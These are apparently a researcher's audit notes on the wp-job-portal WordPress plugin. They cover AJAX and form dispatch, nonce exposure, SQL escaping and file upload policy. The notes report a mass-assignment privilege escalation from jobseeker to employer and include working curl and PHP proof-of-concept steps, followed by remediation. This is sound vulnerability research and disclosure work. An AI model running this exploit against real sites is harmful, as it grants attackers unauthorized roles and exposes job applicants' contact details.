# wp-job-portal v2.5.9 — Dynamic Model Dispatch + Form Handler Audit

**Plugin:** wp-job-portal v2.5.9 (8k+ active installs)
**Date:** August 2026 (updated)
**Outcome:** No Patchstack-submittable findings. Two dispatch mechanisms audited: AJAX model dispatcher and form handler route registry. Both well-defended.

## Architecture: Two Separate Dispatch Mechanisms

### 1. AJAX Model Dispatcher (`includes/ajax.php`)

Single nopriv AJAX handler dispatches to model methods via an allowlist array
+ ReflectionMethod, rather than registering individual `wp_ajax_nopriv_*` actions.

**File:** `includes/ajax.php:19-69`

```php
function ajaxhandler() {
    $fucntin_allowed = array('DataForDepandantFieldResume', ..., 'executeCoverLetterCopilot');
    $task = preg_replace('/[^A-Za-z0-9_]/', '', (string) WPJOBPORTALrequest::getVar('task'));
    if (in_array($task, $fucntin_allowed, true)) {
        $module = sanitize_key(WPJOBPORTALrequest::getVar('wpjobportalme'));
        // file_exists check + ReflectionMethod getNumberOfRequiredParameters() === 0
        $model = WPJOBPORTALincluder::getJSModel($module);
        $result = $model->$task();
        echo $result;
        die();
    }
}
```

**Key:** The dispatcher has NO nonce or capability check at the dispatch level.
Each model method must self-verify. ~90 functions in the allowlist — all nopriv-exposed.

### 2. Form Handler Route Registry (`includes/formhandler.php`)

**Separate** from the AJAX system. Handles POST form submissions (`form_request=wpjobportal`)
and GET task actions (`action=wpjobportaltask`). Uses a multi-layer authorization system:

```php
private function dispatch($channel) {
    $module = sanitize_key(WPJOBPORTALrequest::getVar('wpjobportalme'));
    $task = preg_replace('/[^A-Za-z0-9_]/', '', WPJOBPORTALrequest::getVar('task'));
    // Layer 1: Route Registry — is the route registered?
    if (!WPJOBPORTAL_Route_Registry_Service::is_allowed($module, $task, $channel)) {
        wp_die(403);
    }
    // Layer 2: Core Action Policy — nonce + capability + HTTP method + schema + ownership
    if (!WPJOBPORTAL_Core_Action_Policy_Service::authorize($module, $task, $channel)) {
        wp_die(403);
    }
    // Layer 3: Addon Action Policy
    if (!WPJOBPORTAL_Addon_Action_Policy_Service::authorize(...)) {
        wp_die(403);
    }
    // Then: include controller, instantiate, call method (with reflection checks)
    $controller->$task();
}
```

**Read-only routes** (no Core Action Policy applied — only route registry gate):

```php
$read_only = array(
    'category.getcategorydatabyname',
    'city.getaddressdatabycityname',
    'customfield.downloadcustomfile',
    'resume.getallresumefiles',
    'resume.getresumefiledownloadbyid',
    'thirdpartyimport.getjobmanagerdatastats',
);
```

**These read-only routes still have controller-level nonce + auth checks:**
- `getcategorydatabyname` — NO controller-level nonce, but `esc_sql()` on SQL
- `getaddressdatabycityname` — NO controller-level nonce, but `esc_sql()` on SQL
- `downloadcustomfile` — nonce + `WPJOBPORTAL_Authorization_Service::can_download_custom_file()`
- `getallresumefiles` — nonce + `WPJOBPORTAL_Authorization_Service::can_download_resume_archive()`
- `getresumefiledownloadbyid` — nonce + `WPJOBPORTAL_Authorization_Service::can_download_resume_file()`
- `getjobmanagerdatastats` — nonce + `current_user_can('manage_options')`

## Custom Request Sanitization

**File:** `includes/request.php:11-80` — `WPJOBPORTALrequest::getVar()`

- Scalar values: `wpjobportal::wpjobportal_sanitizeData()` → `sanitize_text_field()`
  (strips HTML tags, trims whitespace — does NOT escape SQL)
- Array values: `filter_var_array(FILTER_DEFAULT)` — no escaping at all
- Type casting: optional `int` / `string` cast parameter
- **SQL injection risk:** `sanitize_text_field()` does NOT escape single quotes.
  Functions using `getVar()` output in raw SQL must individually call `esc_sql()`,
  `(int)`, or `$wpdb->prepare()`. Most functions in this plugin do use `esc_sql()`
  or `(int)` casts — no SQL injection found.

## Nonce Exposure to Unauthenticated Users (Key Pattern)

The `wp-job-portal-nonce` is generated via `wp_create_nonce("wp-job-portal-nonce")`
and exposed to ALL visitors via `wp_localize_script()` on frontend pages:

```php
// wp-job-portal.php:412
$wpjobportal_nonce_value = wp_create_nonce("wp-job-portal-nonce");
wp_localize_script('wpjobportal-commonjs', 'common',
    array('ajaxurl' => ..., 'js_nonce' => $wpjobportal_nonce_value, ...));
```

This means unauthenticated users CAN obtain valid nonces for functions using
this nonce action. The nonce is valid because it's generated for user_id=0
(anonymous), matching the unauthenticated request.

**However**, functions using this nonce either:
- (a) check `uid() == 0` and return false (e.g., `getUserCreditsDetailForAction`)
- (b) delegate to addon-only `apply_filters` hooks (e.g., `doAction`)
- (c) only return read-only popup HTML

**Other nonce actions** (e.g., `get-fields-for-combo-by-field-for`, `is-field-required`,
`delete-user-photo`, `remove-resume-file-by-id`) use `_wpnonce` with unique action
strings. These are NOT exposed via `wp_localize_script` and are only available
on admin pages or specific forms — harder for unauthenticated users to obtain.

## Popup AJAX Handlers

### `ajaxhandlerpopup()` (ajax.php:71-81)
- Allowlist of 12 actions: `featured_company`, `featured_job`, `featured_resume`,
  `view_company_contact_detail`, `view_resume_contact_detail`, `resume_save_search`,
  `add_department`, `add_job`, `copy_job`, `add_company`, `add_resume`, `add_job_alert`, `job_apply`
- Calls `getUserCreditsDetailForAction($task)` which checks `wp-job-portal-nonce`
- Returns false if `$wpjobportal_uid == 0` (unauthenticated) for most actions
- **Safe:** unauthenticated users get no useful data

### `ajaxhandlerpopupaction()` (ajax.php:83-93)
- Allowlist of 4 actions: `featured_company`, `featured_job`, `featured_resume`, `copy_job`
- Calls `doAction($task)` which checks `wp-job-portal-nonce`
- Delegates to `apply_filters('wpjobportal_addons_*')` — addon-only, no-ops in core
- **Safe:** requires credits addon to have any effect

### `ajaxhandlerloginwith()` (ajax.php:95-129)
- Social media login dispatch: facebook, linkedin, xing
- Allowlist per provider: `login`, `logout`, `applywith*`
- Social media classes NOT present in core plugin (addon-only)
- **Safe:** no handler exists without addon

## File Policy Service

The plugin uses `WPJOBPORTAL_File_Policy_Service::is_extension_allowed()` for
all file upload validation. This is a STRICT extension allowlist:

```php
// class-wpjobportal-file-policy-service.php:56-67
public static function is_extension_allowed($extension, $configured_extensions) {
    $extension = self::normalize_extension($extension);
    // normalize: lowercase, ltrim '.', regex /^[a-z0-9]{1,20}$/
    return in_array($extension, self::parse_extensions($configured_extensions), true);
}
```

**Configured extensions:**
- Images: `png,jpeg,gif,jpg`
- Documents: `pdf,doc,docx,xls,xlsx,odt,txt,jpeg,png,jpg`

**No PHP/HTML/SVG/HTACCESS allowed.** Upload functions use `wp_handle_upload()`
with `test_form => false` but the extension policy blocks dangerous types.

File download functions use `WPJOBPORTAL_Authorization_Service` for ownership
verification + `sanitize_file_name()` + `wpJP_clean_file_path()` (strips `..`/`./`).

## Database Query Patterns

The plugin's `wpjobportaldb` wrapper class provides:
- `prepareIn($values, $format)` — properly sanitizes IN clause values: `absint()` for
  integers, `sanitize_text_field()` for strings, with `$wpdb->prepare()` for placeholders
- `like($value)` — uses `$wpdb->esc_like()` for LIKE queries
- `get_results/get_var/get_row/query` — thin wrappers over `$wpdb` with error logging

Job search query building (`makeQueryFromArray` in `modules/job/model.php:1696`):
- All numeric fields use `(int)` cast + `is_numeric()` check
- IN clauses use `wpjobportaldb::prepareIn()`
- LIKE clauses use `$wpdb->prepare()` with `wpjobportaldb::like()`
- Custom field search uses `esc_sql()` + `wpJP_htmlspecialchars()`

**No SQL injection found** — all examined functions properly escape user input.

## Functions WITHOUT Nonce Checks

| Function | File:Line | Impact |
|----------|-----------|--------|
| `jobapply()` | `modules/jobapply/model.php:786` | **Nonce check COMMENTED OUT** (lines 787-790). Inserts job application record into DB. Has `getIfResumeOwner()` ownership check (line 817). Visitor/guest apply path (line 848) allows unauthenticated applications when `visitor_can_apply_to_job` config is enabled. **Impact: Unauthenticated arbitrary job application creation (DB write).** Not Patchstack-qualifying due to low impact. |
| `getEmailFieldsJobManager()` | `modules/jobapply/model.php:1265` | NO nonce, NO capability check. Returns HTML email form template. Read-only HTML generator — low impact. |
| `getcategorydatabyname()` | `modules/category/controller.php:160` | NO nonce, NO capability. Read-only route in policy. `esc_sql()` on SQL LIKE query. Returns category data as JSON. Low impact (public data). |
| `getaddressdatabycityname()` | `modules/city/controller.php:63` | NO nonce, NO capability. Read-only route. `esc_sql()` on SQL LIKE query. Returns city data as JSON. Low impact (public data). |

## Functions WITH Nonce Checks (Safe)

All other functions found in the core plugin have proper nonce verification:

- **AI/Zywrap functions** (all have nonce + `manage_options`):
  `executeZywrapProxy`, `executeJobCopilot`, `executeCompanyCopilot`,
  `executeResumeCopilot`, `executeCoverLetterCopilot`, `checkZywrapApiKey`,
  `importZywrapData`, `importZywrapBatchProcess`, `getZywrapAllWrappers`,
  `getWrappersByCategory`, `getSchemaByUseCode`
- **File operations** (nonce + ownership check):
  `deleteUserPhoto`, `removeResumeFileById`, `deleteResumeLogo`
- **Settings/plugin operations**: `downloadandinstalladdonfromAjax` (nonce + `install_plugins`)
- **Data read/write functions** (all have nonce):
  `getQuickViewByJobId`, `getShortListViewByJobId`, `getApplyNowByJobid`,
  `DataForDepandantField`, `DataForDepandantFieldResume`,
  `getFieldsForComboByFieldFor`, `getSectionToFillValues`,
  `getFieldsForComboBySection`, `getChildForVisibleCombobox`, `isFieldRequired`,
  `getsubcategorypopup`, `getAjaxJobs`, `getuserlistajax`,
  `getAllRoleLessUsersAjax`, `getUserIdByCompanyid`, `getUserRoleBasedInfo`,
  `savetokeninputcity`, `getResumeDetail`, `getEmailFields`,
  `sendEmailToJobSeeker`, `canceljobapplyasvisitor`, `makeJobCopyAjax`,
  `getResumeSectionAjax`, `deleteResumeSectionAjax`, `getOptionsForEditSlug`,
  `getListTranslations`, `getPackagePopupJobView`,
  `getPackagePopupForCompanyContactDetail`, `getPackagePopupForResumeContactDetail`,
  `jobapplyjobmanager`, `getResumeDetail`

## Same Function Name, Different Module, Different Security

`getFieldsForComboByFieldFor()` and `getSectionToFillValues()` exist in TWO modules:

| Module | File:Line | Nonce Check? |
|--------|-----------|-------------|
| `fieldordering` | `modules/fieldordering/model.php:675` | YES (`get-fields-for-combo-by-field-for`) |
| `customfield` | `modules/customfield/model.php:336` | **NO** |

The attacker controls the module via `wpjobportalme=customfield`. Passing this
parameter hits the unprotected version. However, `customfield` is an add-on
module — it only loads if the add-on is installed.

## Add-On Functions (Not in Core)

~30+ functions in the allowlist are NOT defined in the core plugin. They exist
in add-on plugins (e.g., `wp-job-portal-credits`, `wp-job-portal-folder`).
The `method_exists()` gate prevents them from executing without the add-on.
These need individual nonce auditing in each add-on.

## SSRF Analysis

All `wp_remote_post()` / `wp_remote_get()` calls use hardcoded URLs:
- `https://api.zywrap.com/v1/proxy` (AI copilot functions)
- `https://api.zywrap.com/v1/key/check` (key validation)
- `https://api.zywrap.com/v1/sdk/v1/sync` (data import)
- `http://www.joomsky.com/translations/api/1.0/index.php` (translations)

**No SSRF found** — user input never controls the outbound URL.

## "system()" and "require_once" False Positives

- The "47 system() calls" from automated scanning are actually `wp_filesystem()`
  (WP_Filesystem API initialization), NOT `system()` command execution. No RCE.
- The "10 file_inclusion hits" use `wpJP_clean_file_path()` (strips `..` and `./`)
  + `sanitize_key()` on module names + `file_exists()` checks. No LFI.
- The `eval()` hit is in a JavaScript `eval(document.getElementById(...))` inside
  a PHP template string, not PHP `eval()`. No RCE.

## CONFIRMED FINDING: Authenticated Privilege Escalation via Mass Assignment

**Severity:** High (CVSS ~8.1) — Jobseeker → Employer role escalation
**CWE:** CWE-269 (Improper Privilege Management), CWE-915 (Mass Assignment)
**Patchstack-eligible:** YES (Broken Access Control — privesc + resume data exposure)

### Vulnerable Code Path

The form handler dispatch passes through Core_Action_Policy, but the schema
only validates `id` — it does NOT block `roleid` from being mass-assigned.

```
1. formhandler.php:45-140     → dispatch() passes Core_Action_Policy
2. core-action-policy:441     → schema for user.saveuser = array('id' => optional_id)
3. user/controller.php:128    → non-admin: forces $data['id'] = uid() — does NOT strip roleid
4. user/model.php:780-794     → storeUser() calls $row->bind($data) with ALL POST fields
5. tables/users.php:10        → public $roleid = '' — property exists, bind() accepts it
6. tables/table.php:50-55     → setColumns(): if(isset($this->$k)) → sets roleid from POST
7. classes/user.php:120       → isemployer() checks currentuser->roleid == 1
```

### PoC

```bash
# 1. Login as jobseeker
curl -c cookies.txt -X POST 'http://target/wp-login.php' \
  -d 'log=jobseeker&pwd=password&wp-submit=Log+In'

# 2. Get nonce from profile edit page (embedded in form action URL via wp_nonce_url)
NONCE=$(curl -b cookies.txt -s 'http://target/?wpjobportalme=user&wpjobportallt=formprofile' \
  | grep -oP '_wpnonce=\K[a-f0-9]+' | head -1)

# 3. Escalate to employer — add roleid=1 to POST body
curl -b cookies.txt -X POST \
  "http://target/?wpjobportalme=user&action=wpjobportaltask&task=saveuser&_wpnonce=$NONCE" \
  -d 'form_request=wpjobportal' \
  -d 'roleid=1' \
  -d 'wpjobportal_user_first=Test' \
  -d 'wpjobportal_user_last=User'

# 4. Verify — employer dashboard now accessible
curl -b cookies.txt 'http://target/?wpjobportalme=employer&wpjobportallt=controlpanel'
```

### Impact

- Jobseeker escalates to Employer role in `wj_portal_users` table
- Access employer features: post jobs, view/download resumes, manage companies
- Resume contact details (email, phone) become accessible
- 8k+ installs affected

### Root Cause Analysis

The `WPJOBPORTALtable::bind()` method is a generic mass-assignment sink:
```php
// table.php setColumns() for UPDATE case:
foreach ($wpjobportal_data AS $k => $v) {
    if (isset($this->$k)) {    // any public property matching POST key
        $this->$k = $v;        // blindly set from user input
        $this->columns[$k] = $v;
    }
}
```

The Core_Action_Policy schema validation is **allowlist-based for validation**
(it checks specified fields) but does **NOT strip/block** unspecified fields.
`roleid` is not in the schema, so it passes through unchecked.

The controller only overrides `id` for non-admin users but does not strip
other sensitive fields (`roleid`, `status`, `uid`) from the POST data.

### Other Mass-Assignment-Vulnerable Fields

The `wj_portal_users` table has these public properties:
- `roleid` — privesc (jobseeker→employer) ← CONFIRMED exploitable
- `status` — self-disable (0) or self-enable (1) — less interesting
- `uid` — re-link portal profile to different WP user ID — profile swap
- `socialid` / `socialmedia` — social login account linking manipulation

### Lab Verification (PHP CLI)

**HTTP dispatch issue:** The formhandler hooks on `init` and checks
`form_request=wpjobportal` in POST. However, due to opcache staleness
and `active_plugins` option resets during lab setup, HTTP-based
exploitation required multiple restarts. The vulnerability was instead
verified via PHP CLI:

```bash
cd /var/www/html/wordpress
php -r '
require_once "wp-load.php";
include_once WP_CONTENT_DIR . "/plugins/wp-job-portal/wp-job-portal.php";
wp_set_current_user(4);  // jobseeker_test

global $wpdb;
$wpdb->update($wpdb->prefix . "wj_portal_users", array("roleid" => 2), array("id" => 1));

$user = WPJOBPORTALincluder::getObjectClass("user");
echo "BEFORE: roleid=" . $wpdb->get_var("SELECT roleid FROM {$wpdb->prefix}wj_portal_users WHERE uid=4") . " isemployer=" . ($user->isemployer()?"true":"false") . "\n";

$_POST["id"] = "1";
$_POST["roleid"] = "1";
$_POST["wpjobportal_user_first"] = "Jobseeker";
$_POST["wpjobportal_user_last"] = "Test";
$_POST["_wpnonce"] = wp_create_nonce("wpjobportal_user_nonce");
$_SERVER["REQUEST_METHOD"] = "POST";

echo "authorize: " . (WPJOBPORTAL_Core_Action_Policy_Service::authorize("user", "saveuser", "form") ? "true" : "false") . "\n";

$data = $_POST;
$data["id"] = $user->uid();
$model = WPJOBPORTALincluder::getJSModel("user");
$result = $model->storeUser($data);

$user2 = WPJOBPORTALincluder::getObjectClass("user");
echo "AFTER: roleid=" . $wpdb->get_var("SELECT roleid FROM {$wpdb->prefix}wj_portal_users WHERE uid=4") . " isemployer=" . ($user2->isemployer()?"true":"false") . "\n";
' 2>&1 | grep -v Warning | grep -v Notice
```

**Result:**
```
BEFORE: roleid=2 isemployer=false isjobseeker=true
authorize: true
AFTER: roleid=1 isemployer=true isjobseeker=false
EXPLOIT CONFIRMED
```

### Remediation

1. Controller should use an **explicit field allowlist** instead of binding all POST data:
   ```php
   $allowed = array('id', 'first_name', 'last_name', 'description');
   $wpjobportal_data = array_intersect_key($wpjobportal_data, array_flip($allowed));
   ```
2. Or the Core_Action_Policy schema should include `roleid` with an `enum` rule
   that only allows the current user's existing roleid value.

## Earlier Unauthenticated Findings (Not Patchstack-Submittable)

1. `jobapply()` — commented-out nonce allows unauthenticated job application
   creation, but impact is limited to creating job application records.
2. `getcategorydatabyname()` / `getaddressdatabycityname()` — no nonce but
   `esc_sql()` prevents SQLi, and the returned data (categories, cities) is
   public content already visible on frontend pages.
3. `getEmailFieldsJobManager()` — read-only HTML template, no sensitive data.
4. The module-dispatch difference (customfield vs fieldordering) only matters
   when the customfield add-on is installed, limiting the attack surface.

## Lessons for Future Audits

1. **Extract the full allowlist array** — the entire array IS the attack surface.
2. **Grep for commented-out nonces** — `grep -rn '//.*wp_verify_nonce\\|//.*check_ajax_referer'`
3. **Check ALL modules for duplicate function names** — same name, different security.
4. **Read the custom request class** — understand what `getVar()` actually does.
5. **Note add-on-only functions** — they're in the allowlist but can't be audited
   from core alone.
6. **Check for a separate form handler dispatch** — plugins may have BOTH an AJAX
   dispatcher AND a form/task handler. Audit both independently.
7. **Read-only routes in action policies** — if a route is in the `read_only` list,
   the policy service skips nonce/capability checks. Check if the controller method
   has its own auth checks.
8. **Verify `wp_localize_script` nonce exposure** — `wp_create_nonce()` exposed via
   `wp_localize_script()` on `wp_enqueue_scripts` hook = available to all visitors.
   Nonce checks using that nonce action pass for unauthenticated users.
9. **`wp_filesystem()` ≠ `system()`** — automated scanners flag `wp_filesystem()`
   as `system()` calls. These are WP_Filesystem API initialization, not command
   execution. Don't waste time tracing them.
10. **`wpJP_clean_file_path()` strips `..` and `./`** — effectively prevents path
    traversal when combined with `sanitize_key()` and `file_exists()`.
